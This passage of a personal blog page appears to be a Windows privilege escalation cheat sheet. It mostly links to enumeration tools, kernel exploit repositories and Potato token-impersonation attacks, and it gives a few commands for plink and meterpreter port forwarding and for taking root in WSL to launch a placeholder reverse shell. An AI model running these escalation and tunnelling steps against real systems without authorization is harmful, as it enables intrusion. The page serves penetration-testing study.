href=https://github.com/GhostPack/SharpUp>https://github.com/GhostPack/SharpUp</a></li></ul><h3 id=powershell>Powershell</h3><ul><li>Sherlock - <a href=https://github.com/rasta-mouse/Sherlock>https://github.com/rasta-mouse/Sherlock</a></li><li>PowerUp - <a href=https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc>https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc</a></li><li>JAWS-Enum - <a href=https://github.com/411Hall/JAWS>https://github.com/411Hall/JAWS</a></li></ul><h3 id=other-exploit-suggestors>Other (Exploit Suggestors)</h3><ul><li><p>Windows Exploit Suggester - <a href=https://github.com/AonCyberLabs/Windows-Exploit-Suggester>https://github.com/AonCyberLabs/Windows-Exploit-Suggester</a></p></li><li><p>Metasploit Local Exploit Suggester - <a href=https://blog.rapid7.com/2015/08/11/metasploit-local-exploit-suggester-do-less-get-more/>https://blog.rapid7.com/2015/08/11/metasploit-local-exploit-suggester-do-less-get-more/</a></p><p><code>run post/multi/recon/local_exploit_suggester</code></p></li></ul><hr><h2 id=escalation-path>ESCALATION PATH</h2><h3 id=escalation-path--kernel-exploits>Escalation Path : Kernel Exploits</h3><ul><li>Kernel Exploits Suggestors (On the system)<ul><li><code>post/wwindows/gather/enum_patches</code></li><li><code>post/multi/recon/local_exploit_suggester</code></li><li><a href=https://github.com/rasta-mouse/Watson>watson</a></li><li><a href=https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite>winpeas</a> (Winpeas has watson embedded)</li></ul></li><li>Locally with system information<ul><li><a href=https://github.com/AonCyberLabs/Windows-Exploit-Suggester>https://github.com/AonCyberLabs/Windows-Exploit-Suggester</a></li><li><a href=https://github.com/bitsadmin/wesng>https://github.com/bitsadmin/wesng</a></li></ul></li><li>Github repos of Exploits<ul><li><a href=https://github.com/nomi-sec/PoC-in-GitHub>https://github.com/nomi-sec/PoC-in-GitHub</a></li><li><a href=https://github.com/abatchy17/WindowsExploits>https://github.com/abatchy17/WindowsExploits</a></li><li><a href=https://github.com/SecWiki/windows-kernel-exploits>https://github.com/SecWiki/windows-kernel-exploits</a></li></ul></li></ul><h3 id=port-forwarding-and-tunnelling>Port Forwarding And Tunnelling</h3><ul><li>Read More about Port Forwarding and tunnelling here (<a href=https://book.hacktricks.xyz/generic-methodologies-and-resources/tunneling-and-port-forwarding>https://book.hacktricks.xyz/generic-methodologies-and-resources/tunneling-and-port-forwarding</a>)</li><li>Check this as well (<a href=https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html>https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html</a>)</li><li>Using Plink for Port Forwarding (<a href=https://book.hacktricks.xyz/generic-methodologies-and-resources/tunneling-and-port-forwarding#plink.exe>https://book.hacktricks.xyz/generic-methodologies-and-resources/tunneling-and-port-forwarding#plink.exe</a>)</li></ul><h3 id=escalation-path--passwords-and-port-forwarding>Escalation Path : Passwords and Port Forwarding</h3><ul><li>Port Forwarding And Tunnelling<ul><li>Read More about Port Forwarding and tunnelling here (<a href=https://book.hacktricks.xyz/generic-methodologies-and-resources/tunneling-and-port-forwarding>https://book.hacktricks.xyz/generic-methodologies-and-resources/tunneling-and-port-forwarding</a>)</li><li>Using Plink for Port Forwarding (<a href=https://book.hacktricks.xyz/generic-methodologies-and-resources/tunneling-and-port-forwarding#plink.exe>https://book.hacktricks.xyz/generic-methodologies-and-resources/tunneling-and-port-forwarding#plink.exe</a>)</li></ul></li></ul><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#75715e># Port forward using plink</span>
plink.exe -l root -pw mysecretpassword 192.168.0.101 -R 8080:127.0.0.1:8080

<span style=color:#75715e># Port forward using meterpreter</span>
portfwd add -l &lt;attacker port&gt; -p &lt;victim port&gt; -r &lt;victim ip&gt;
portfwd add -l <span style=color:#ae81ff>3306</span> -p <span style=color:#ae81ff>3306</span> -r 192.168.1.101
</code></pre></div><ul><li>Check out this (<a href=https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#files-and-registry-credentials>https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#files-and-registry-credentials</a>)</li><li>Check the Above Password Hunting Section as well.</li></ul><h3 id=escalation-path--windows-subsystem-for-linux>Escalation Path : Windows Subsystem For Linux</h3><ul><li>Read more here (<a href=https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#windows-subsystem-for-linux-wsl>https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#windows-subsystem-for-linux-wsl</a>)</li><li>Check this as well (<a href=https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#eop---windows-subsystem-for-linux-wsl>https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology and Resources/Windows - Privilege Escalation.md#eop&mdash;windows-subsystem-for-linux-wsl</a>)</li><li>Finding WSL and BASH in Windows System<ul><li><code>where /R c:\windows bash.exe</code></li><li><code>where /R c:\windows wsl.exe</code></li></ul></li><li>If you get root user you can listen on any port (the first time you use <code>nc.exe</code> to listen on a port it will ask via GUI if <code>nc</code> should be allowed by the firewall).</li></ul><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c <span style=color:#e6db74>&#39;BIND_OR_REVERSE_SHELL_PYTHON_CODE&#39;</span>
</code></pre></div><ul><li>You can explore the <code>WSL</code> filesystem in the folder <code>C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\</code></li></ul><h3 id=escalation-path--impersonation-and-potato-attacks>Escalation Path : Impersonation and Potato Attacks</h3><ul><li><p>Check the available Privileges for possible Privilege Escalation</p><ul><li>You can check your own privileges with <code>whoami /priv</code>. <strong>Disabled privileges are as good as enabled ones</strong>. The only important thing is if you have the privilege on the list or not.</li><li>Privileges to look for <a href=https://github.com/gtworek/Priv2Admin>in the list</a> (Whether disabled or enabled not matters)<ul><li><code>SeImpersonate</code></li><li><code>SeAssignPrimaryToken</code></li><li><code>SeTcb</code></li><li><code>SeBackup</code></li><li><code>SeRestore</code></li><li><code>SeCreateToken</code></li><li><code>SeLoadDriver</code></li><li><code>SeTakeOwnership</code></li><li><code>SeDebug</code></li><li>Check out the <a href=https://github.com/gtworek/Priv2Admin>complete List Here</a></li></ul></li></ul></li><li><p>Attacks using above Privileges</p><ul><li><a href=https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#rottenpotato-token-impersonation>RottenPotato (Token Impersonation)</a> - (<a href=https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/rottenpotato>Check This As well</a>)</li><li><a href=https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#juicy-potato-abusing-the-golden-privileges>Juicy Potato (Abusing the golden privileges)</a> - (<a href=https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/juicypotato>Check This as well</a>)</li><li><a href=https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#rogue-potato-fake-oxid-resolver>Rogue Potato (Fake OXID Resolver)</a></li><li><a href=https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#efspotato-ms-efsr-efsrpcopenfileraw>EFSPotato (MS-EFSR EfsRpcOpenFileRaw)</a></li><li><a href=https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#meterpreter-getsystem-and-alternatives>Meterpreter getsystem and alternatives</a></li><li><a href=https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#restore-a-service-accounts-privileges>Restore A Service Account&rsquo;s Privileges</a></li></ul></li><li><p>Access Tokens (<a href=https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/access-tokens>https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/access-tokens</a>)</p></li><li><p>Privilege Escalation Abusing Tokens (<a href=https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens>https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens</a>)</p></li><li><p>Full token privileges cheatsheet at ****<a href=https://github.com/gtworek/Priv2Admin>https://github.com/gtworek/Priv2Admin</a></p></li><li><p>Read More Here (<a href=https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#eop---impersonation-privileges>https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology and Resources/Windows - Privilege Escalation.md#eop&mdash;impersonation-privileges</a>)</p></li><li></li></ul></div></article><hr><div class=post-info></div></main></div><footer class=footer><div class=footer__inner></div><div class=footer__inner><div class=footer__content><span></span><span>Made with üíõ by <a href=/>An0nud4y</a></span></div></div></footer></div><script type=text/javascript src=/bundle.min.dc716e9092c9820b77f96da294d0120aeeb189b5bcea9752309ebea27fd53bbe6b13cffb2aca8ecf32525647ceb7001f76091de4199ac5a3caa432c070247f5b.js integrity="sha512-3HFukJLJggt3+W2ilNASCu6xibW86pdSMJ6+on/VO75rE8/7KsqOzzJSVkfOtwAfdgkd5BmaxaPKpDLAcCR/Ww=="></script></body></html>